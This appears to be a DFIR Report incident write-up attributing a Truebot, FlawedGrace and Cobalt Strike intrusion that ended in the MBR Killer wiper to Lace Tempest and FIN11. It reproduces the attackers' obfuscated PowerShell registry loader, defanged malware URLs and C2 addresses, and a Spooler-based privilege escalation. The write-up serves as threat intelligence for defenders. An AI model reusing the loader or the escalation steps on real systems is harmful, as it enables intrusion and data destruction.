<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-18950" class="post-18950 post type-post status-publish format-standard hentry category-adfind category-attribution category-cobaltstrike category-exfiltrate-data category-fin11 category-flawedgrace category-lace-tempest category-truebot entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
<a class="category-color-119" href="https://thedfirreport.com/category/attribution/">Attribution</a>
<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
<a class="category-color-97" href="https://thedfirreport.com/category/exfiltrate-data/">Exfiltrate Data</a>
<a class="category-color-118" href="https://thedfirreport.com/category/fin11/">FIN11</a>
<a class="category-color-116" href="https://thedfirreport.com/category/flawedgrace/">FlawedGrace</a>
<a class="category-color-117" href="https://thedfirreport.com/category/lace-tempest/">Lace Tempest</a>
<a class="category-color-114" href="https://thedfirreport.com/category/truebot/">truebot</a>
</span>
</div>
<h1 class="entry-title">A Truly Graceful Wipe Out</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/" rel="bookmark"><time class="entry-date published" datetime="2023-06-12T01:06:26+00:00">June 12, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p>In this intrusion, dated May 2023, we observed <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.silence" target="_blank" rel="noopener">Truebot</a> being used to deploy Cobalt Strike and <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.flawedgrace" target="_blank" rel="noopener">FlawedGrace</a> (aka GraceWire &amp; BARBWIRE) resulting in the exfiltration of data and the deployment of the MBR Killer wiper. The threat actors deployed the wiper within 29 hours of initial access.</p>
<h2 id="services" class="wp-block-heading"><a href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/#services">Services</a></h2>
<ul>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noopener">Private Threat Briefs</a>:</strong> Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>
<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p>Contact us today for a demo!</p>
<p></p>


<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>


<p>In this case, Truebot was delivered through a Traffic Distribution System (TDS) reported by <a href="https://twitter.com/threatinsight/status/1666403634312105987?s=20" target="_blank" rel="noreferrer noopener">Proofpoint as &#8220;404 TDS&#8221;</a>. This campaign, observed in May 2023, leveraged email for the initial delivery mechanism. After clicking-through the link in an email, the victim would be redirected through a series of URLs before being presented a file download at the final landing page.</p>


<p>The file download was a Truebot executable, which appeared as a fake Adobe Acrobat document. After executing the file, Truebot copied and renamed itself. Minutes later, Truebot loaded FlawedGrace onto the host. While loading this malware, it used a series of modifications to the registry and Print Spooler service to both escalate privileges and establish persistence. From there, FlawedGrace&#8217;s execution routine involved storing as well as extracting, encoded and encrypted payloads in registry; the creation of temporary scheduled tasks and the injection of the final payload into msiexec.exe and svchost.exe.</p>


<p>After this execution, the threat actors proceeded to disable Windows Defender Real-Time monitoring and added exclusions for executable files on the host. We later observed FlawedGrace creating a temporary user within the local Administrators and Remote Desktop Users groups. With this user, a tunneled RDP connection was attempted from FlawedGrace&#8217;s C2 servers. Seemingly without success, the threat actors removed the user after 15 minutes before repeating the procedure a second time. After the second failed attempt, the threat actors removed the user and did not attempt further RDP communications. The FlawedGrace process then performed discovery surrounding the domain administrators and domain controllers.</p>


<p>Approximately two hours after the initial execution, Truebot loaded Cobalt Strike into memory and then went dormant for the next two hours. This ended the use of Truebot for the rest of the intrusion, with FlawedGrace and Cobalt Strike being leveraged for the rest of the threat actors activity. Now, four hours into the intrusion the threat actors, through the Cobalt Strike beacon, started another round of discovery commands using net, nltest, tasklist and AdFind.exe.</p>


<p>After having accessed LSASS memory on the beachhead host, the threat actors leveraged a local administrator hash to perform pass-the-hash lateral movement through the environment. The threat actors used Impacket&#8217;s atexec to execute discovery commands on remote hosts. These discovery commands included the PowerShell, cmdlet Get-MpComputerStatus, and quser. After these discovery commands, the threat actors used Cobalt Strike&#8217;s jump psexec module to further move between hosts. Following each lateral movement action, Cobalt Strike loaded FlawedGrace in memory on all hosts accessed by the adversary.</p>


<p>Around five hours post initial access, the threat actors went silent. FlawedGrace and Cobalt Strike went dormant on all hosts except the beachhead system. Seventeen hours later, the threat actors returned to the network and issued enumeration commands to discover network shares. Around that time, we observed signs of data exfiltration from the environment.</p>


<p>Roughly four hours after the exfiltration began, merely 29 hours into the intrusion, the threat actors deployed the MBR Killer wiper on all hosts where FlawedGrace had been running, including a file server. This executable overwrote the MBR (Master Boot Record) and triggered a reboot, rendering the hosts unusable. Numerous systems were left at the boot screen, inoperable.</p>


<p>Following these actions, the threat actors lost all footholds to the network. While data has been exfiltrated, no responsibility has been claimed and no extortion notes were found.<a href="#services">
</a></p>
<h2 id="attribution"><a href="#attribution">Attribution</a></h2>
<p>Truebot (a.k.a. <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.silence" target="_blank" rel="noreferrer noopener">Silence.Downloader</a>) has been attributed to the Silence group which have had long standing interactions with financially motivated criminal group <a href="https://malpedia.caad.fkie.fraunhofer.de/actor/ta505" target="_blank" rel="noreferrer noopener">TA505</a> (spammer/distribution). The <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.flawedgrace" target="_blank" rel="noreferrer noopener">FlawedGrace</a> malware has been reportedly associated, but not exclusive, to TA505, and has commonly been distributed by Truebot.</p>
<p>Most recently, an activity group reported by <a href="https://twitter.com/MsftSecIntel/status/1651346659291308036?s=20" target="_blank" rel="noreferrer noopener">Microsoft as Lace Tempest</a> was observed running a Cl0p extortion operation. According to Microsoft &#8220;Lace Tempest (DEV-0950) is a Clop ransomware affiliate that has been observed using GoAnywhere exploits and Raspberry Robin infection hand-offs in past ransomware campaigns.&#8221;</p>
<p>
</p>
<blockquote class="wp-block-quote">
<p>&#8220;Lace Tempest operates in two modes. One mode where they deploy Cl0p enterprise wide and the other where they do mass exploitation against file transfer servers &#8211; and steal data (and possibly deploy mbrkiller). Both sets of victims show up on Cl0p leak site. Even if the ransom payload wasn’t deployed.&#8221;</p>
<p><span style="font-size: 1.25rem;">&#8211; Christopher Glyer, Principal Security Researcher with Microsoft Threat Intelligence</span></p>
</blockquote>
<p>The MBR Killer binary in this case was attributed to the Lace Tempest activity group per Microsoft. Microsoft also recently attributed the <a href="https://twitter.com/cglyer/status/1665539162462736386" target="_blank" rel="noopener">MOVEit Transfer 0-day (CVE-2023-34362) exploitation</a> to Lace Tempest.</p>
<p>According to Mandiant, in January 2023 FIN11 was observed deploying TRUECORE (a version of Truebot) and BARBWIRE (FlawedGrace) after exploiting a SolarWinds Serv-U server (CVE-2021-35211). During this time, BARBWIRE C2 was communicating with 5.188.86[.]18:443, which we observed in this case. In April, Mandiant again observed BARBWIRE C2 communicating to 5.188.86[.]18:443 as well as 92.118.36[.]199:443, which was also observed during this case. During this time period, Mandiant also noted that shellcode payloads were staged on a TRUECORE C2 server, which pointed to 5.188.206[.]78, the Cobalt Strike server in this case. Mandiant also confirmed that they&#8217;ve observed FIN11 using MBR Killer as early as 2019. According to Mandiant, FIN11 has used BARBWIRE since at least 2018, and they believe that the backdoor is exclusive to the threat group. Mandiant also recently attributed the <a href="https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft" target="_blank" rel="noopener">MOVEit Transfer 0-day (CVE-2023-34362) exploitation</a> to FIN11.</p>
<p>Due to the overlap of TTPs, we are attributing this intrusion with high confidence to Lace Tempest and FIN11 with possible TA505 overlaps.</p>
<h2 id="analysts" class="wp-block-heading"><a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/#analysts">Analysts</a></h2>


<figure class="wp-block-image"></figure>


<p>Analysis and reporting by <a href="https://twitter.com/Kostastsale">@Kostastsale</a>, <a href="https://twitter.com/svch0st">@svch0st</a> and <a href="https://twitter.com/0xThiebaut">@0xThiebaut</a>.</p>



<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>


<p>As is the case for many intrusions, initial access was obtained through an email campaign. Reports by Proofpoint point to this campaign using the <a href="https://twitter.com/threatinsight/status/1666403634312105987" target="_blank" rel="noopener">404 Traffic Distribution System (TDS) service</a>. The following <a href="https://twitter.com/threatinsight/status/1666441387447926797" target="_blank" rel="noreferrer noopener">Proofpoint screenshots</a> highlight how &#8220;404 TDS&#8221; is leveraged to turn email campaigns into drive-by downloads.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-18956" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-001.png" alt width="609" height="385" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-001.png 609w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-001-300x190.png 300w" sizes="(max-width: 609px) 100vw, 609px" /></a></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-001-1.png"><img decoding="async" class="aligncenter size-full wp-image-19151" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-001-1.png" alt width="922" height="933" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-001-1.png 922w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-001-1-296x300.png 296w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-001-1-768x777.png 768w" sizes="(max-width: 922px) 100vw, 922px" /></a></p>



<p>During this intrusion, the TDS redirection was <a href="https://twitter.com/threatinsight/status/1666489627622899712" target="_blank" rel="noreferrer noopener">reported by Proofpoint</a> as follows:</p>


<ol>
<li>hxxps[:]//hrcbishtek[.]com/{5 alphanumeric characters}</li>


<li>hxxps[:]//imsagentes[.]pe/dgrjfj</li>


<li>hxxps[:]//imsagentes[.]pe/dgrjfj/</li>


<li>hxxps[:]//ecorfan[.]org/base/sj/Document_may_24_16654.exe</li>
</ol>


<p>The resulting hxxps[://]ecorfan[.]org/base/sj/Document_may_24_16654[.]exe URL performed a drive-by download, delivering the initial Truebot payload Document_may_24_16654.exe.</p>


<p>The usage of the deceptive Document_may_24_16654.exe naming would then entice fooled users to open what they believe is a recent document.</p>


<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>


<p>Truebot was used to load both Cobalt Strike and FlawedGrace on the initial host.</p>


<p><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-003.png"><img decoding="async" class="aligncenter size-full wp-image-18958" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-003.png" alt width="1161" height="670" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-003.png 1161w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-003-300x173.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-003-1024x591.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-003-768x443.png 768w" sizes="(max-width: 1161px) 100vw, 1161px" /></a></p>


<h3 class="wp-block-heading">Truebot</h3>


<p>The payload, Document_may_24_16654.exe, imitated a PDF document by using an icon of an Adobe Acrobat document.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18959" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-004.png" alt width="400" height="194" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-004.png 400w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-004-300x146.png 300w" sizes="(max-width: 400px) 100vw, 400px" /></a></figure>


<p>This was further enforced upon the user when the malware created the following message claiming Adobe Acrobat failed to open the file (even if Acrobat was not installed on the target system).</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18960" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-005.png" alt width="618" height="274" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-005.png 618w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-005-300x133.png 300w" sizes="(max-width: 618px) 100vw, 618px" /></a></figure>


<p>Truebot&#8217;s first action was to create an exact copy of itself in the following path and then execute it.</p>


<pre class="wp-block-preformatted">C:\Intel\RuntimeBroker.exe
</pre>


<p>The newly created copy reached out to the Truebot C2 of essadonio[.]com (45.182.189[.]71).</p>


<h3 class="wp-block-heading">Cobalt Strike</h3>


<p>Truebot spawned an instance of C:\Windows\system32\cmd.exe which was followed-up by a remote thread created in the new process. The memory of cmd.exe clearly indicated signs of injection, as seen below, where a section of memory was set to execute and read write as well as the telltale MZ (0x4d5a) header of a PE binary.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18961" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-006.png" alt width="961" height="199" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-006.png 961w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-006-300x62.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-006-768x159.png 768w" sizes="(max-width: 961px) 100vw, 961px" /></a></figure>


<p>Further investigation identified the injected module beacon.dll at the same offset as above (0x164a2fb0000) in the loaded modules of the target process.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18962" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-007.png" alt width="1448" height="170" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-007.png 1448w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-007-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-007-1024x120.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-007-768x90.png 768w" sizes="(max-width: 1448px) 100vw, 1448px" /></a></figure>


<p>This is the default naming convention for generating payloads from Cobalt Strike, and stands out further as the DLL did not have a path on disk.</p>


<p>This Cobalt Strike beacon was used both to query information and move around the network which will be discussed in later sections.</p>


<p>During the intrusion, the process running the beacon spawned the following process command line:</p>


<pre class="wp-block-preformatted">ping  -n 1 &lt;REDACTED&gt;shell wmic /node:&lt;REDACTED&gt; process get executablepath
</pre>


<p>As we have observed in previous cases, threat actors make mistakes too! In this case, the <strong>shell</strong> argument is a beacon command to spawn a new process. Here, we see it mashed between two commands indicating human error.</p>


<h3 class="wp-block-heading">FlawedGrace</h3>


<p>Truebot loaded another more complicated payload alongside Cobalt Strike, the Remote Access Trojan (RAT) &#8220;FlawedGrace.&#8221; The initial execution chain of this malware was observed across multiple endpoints when they were first infected.</p>


<p>The first observed behavior of this chain was to create a new instance of spoolsv.exe that was shortly accessed by the Truebot process (RuntimeBroker.exe). This process would then spawn instances of msiexec.exe, which would reach out to the initial FlawedGrace C2 of 92.118.36[.]199.</p>


<p>Instead of creating a task through schtasks.exe, FlawedGrace used three different methods to create new scheduled tasks. The first was to import the taskschd.dll library into the main host process to create a new task called 2. The task was removed as soon as the new command gained SYSTEM-level privileges.</p>


<p>The second was observed within obfuscated PowerShell, where the Schedule.Service COM Object was used to create a new task.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18963" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-008.png" alt width="1162" height="148" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-008.png 1162w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-008-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-008-1024x130.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-008-768x98.png 768w" sizes="(max-width: 1162px) 100vw, 1162px" /></a></figure>


<p>The last method was to use native PowerShell cmdlets to register a task.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18964" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-009.png" alt width="1179" height="134" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-009.png 1179w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-009-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-009-1024x116.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-009-768x87.png 768w" sizes="(max-width: 1179px) 100vw, 1179px" /></a></figure>


<p>The initial task \2 ran the following command which was scheduled for the next minute after creation:</p>


<pre class="wp-block-preformatted">powershell -c "&amp;{(-join('246A3D277B38443831363736432D374636332D384638312D363736452D3636364236433637383138447D273B285B546578742E456E636F64696E675D3A3A555446382E476574537472696E6728286770202827686B6C6D3A5C736F6674776172655C325C636C7369645C272B246A2B275C747970656C69622729292E246A29297C2E28282D6A6F696E2828246572726F722E746F737472696E672829295B2831342A31292C28342F31292C5B696E745D28313636352F31363531295D29292E7265706C616365282779272C2778272929'-split'(..)'|?{$_}|%{ [char] [convert]::ToUInt32($_,16)}))|.((-join(($error.tostring())[(14/1),(4*1),$true])).replace('y','x'))}"
</pre>


<p>The first working part of the command decodes the obfuscated string and results in the following PowerShell code:</p>



<pre class="wp-block-preformatted">$j='{8D81676C-7F63-8F81-676E-666B6C67818D}';([Text.Encoding]::UTF8.GetString((gp ('hklm:\\software\\2\\clsid\\'+$j+'\\typelib')).$j))
</pre>


<p>The decoded code sets the variable $j to the value {8D81676C-7F63-8F81-676E-666B6C67818D}. It then reads a value from the Windows Registry under the SOFTWARE\2\CLSID\{8D81676C-7F63-8F81-676E-666B6C67818D}\Type key, converts the value to a UTF-8 string, and executes it.</p>


<p>Based on script block logging, the PowerShell script contained in the registry would manipulate and populate further registry keys in the HKLM:\Software\Classes\CLSID\ key using HKLM:\Software\2\CLSID as a staging location. The malware created specific key names attempting to blend in with other COM objects which were also kept within this location. The malware would create additional scheduled tasks using one of the following names selected randomly:</p>


<pre class="wp-block-preformatted">\Microsoft\Windows\System diagnostics service
\Microsoft\Windows\System diagnostics monitor
\Microsoft\Windows\System monitor
\Microsoft\Windows\System service
</pre>


<p>The final loaded PowerShell script was stored here:</p>
<pre>HKLM\Classes\CLSID\{8D81676C-7F63-8F81-676E-666B6C67818D}\TypeLib</pre>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18966" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-010.png" alt width="1581" height="680" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-010.png 1581w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-010-300x129.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-010-1024x440.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-010-768x330.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-010-1536x661.png 1536w" sizes="(max-width: 1581px) 100vw, 1581px" /></a></figure>


<p>The PowerShell code in TypeLib would decrypt the RC4 encrypted payload stored in ProgID using a key based on the hostname ($env:COMPUTERNAME) of the target host and then inject the DLL into the FlawedGrace msiexec.exe and svchost.exe processes.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18967" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-011.png" alt width="1526" height="675" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-011.png 1526w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-011-300x133.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-011-1024x453.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-011-768x340.png 768w" sizes="(max-width: 1526px) 100vw, 1526px" /></a></figure>


<p><em>The encrypted DLL stored in Registry</em></p>


<p>We manually reversed the RC4 function to decrypt the DLL, which matched the same hash as the FlawedGrace processes in memory (c.dll)</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18968" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-012.png" alt width="1468" height="157" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-012.png 1468w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-012-300x32.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-012-1024x110.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-012-768x82.png 768w" sizes="(max-width: 1468px) 100vw, 1468px" /></a></p>



<p>The PE details of the injected module c.dll was of a DLL with an original name of icuin.dll, claiming to be part of the International Components for Unicode libraries, as see below:</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18969" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-013.png" alt width="358" height="368" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-013.png 358w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-013-292x300.png 292w" sizes="(max-width: 358px) 100vw, 358px" /></a></figure>


<p>When FlawedGrace attempted to run certain commands on the target host, it displayed the specific behavior of spawning an instance of cmd.exe as a sacrificial intermediate process.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18970" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-014.png" alt width="715" height="501" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-014.png 715w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-014-300x210.png 300w" sizes="(max-width: 715px) 100vw, 715px" /></a></figure>


<p>Shortly after these instances of cmd.exe were spawned, they would be accessed by the FlawedGrace process svchost.exe.</p>


<p>Of note, the arguments in these processes command lines used flags that do not exist (/I, /SI, /O, /SO):</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18971" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-015.png" alt width="695" height="488" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-015.png 695w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-015-300x211.png 300w" sizes="(max-width: 695px) 100vw, 695px" /></a></figure>


<p>A Sigma rule to detect this activity can be found at the end of the report.</p>


<h2 id="persistence" class="wp-block-heading"><a href="#presistence">Persistence</a></h2>


<p>Threat actors established persistence on all infected hosts they pivoted to in the network. The scheduled tasks were configured to load FlawedGrace using PowerShell. While the tasks created initially to run FlawedGrace were registered with the task name of <strong>\2</strong> , tasks created for persistence used a naming convention mimicking various system tasks and placed under the \Microsoft\Windows\ task path.</p>


<pre class="wp-block-preformatted">\Microsoft\Windows\System diagnostics monitor
\Microsoft\Windows\System monitor
\Microsoft\Windows\System service
</pre>


<p>These tasks were then set up for a <a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/boottrigger" target="_blank" rel="noreferrer noopener">BootTrigger</a> to restart the malware.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18972" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-016.png" alt width="1841" height="924" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-016.png 1841w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-016-300x151.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-016-1024x514.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-016-768x385.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-016-1536x771.png 1536w" sizes="(max-width: 1841px) 100vw, 1841px" /></a></figure>


<p>Please refer to the &#8220;FlawedGrace&#8221; portion of the <a href="#execution">Execution section</a> for details on the different execution methods threat actors used to register these scheduled tasks.</p>


<p>On the beachhead host, the threat actors added a user account named adminr. This account was then added to the Local Administrators group and Remote Desktop Users group. The account was observed being used to test RDP tunneling in the environment. This account was added and removed several times, but after the first three hours of access, it was deleted and not re-added by the threat actors.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18973" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-017.png" alt width="1786" height="541" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-017.png 1786w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-017-300x91.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-017-1024x310.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-017-768x233.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-017-1536x465.png 1536w" sizes="(max-width: 1786px) 100vw, 1786px" /></a></figure>
<p>&nbsp;</p>


<h2 id="privilege-escalation" class="wp-block-heading"><a href="#priviege-escalation">Privilege Escalation</a></h2>


<p>We believe that to elevate their privileges, the threat actor might have abused an odd default Windows behavior surrounding changing service permissions:</p>


<blockquote class="wp-block-quote">
<p>The change in required [service] privileges takes effect the next time the service is started. [&#8230;] <strong>If you do not set the required privileges, the SCM uses all the privileges assigned by default to the process token</strong>. <span style="font-size: 1.25rem;">&#8211; <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsvc/ns-winsvc-service_required_privileges_infoa#remarks" target="_blank" rel="noopener">Source </a></span></p>
</blockquote>


<p>To abuse this SCM behavior, the threat actors were seen stopping the Spooler service before deleting the service&#8217;s HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Spooler\RequiredPrivileges registry entry, restarting the service and injecting into the newly created spoolsv.exe process.</p>


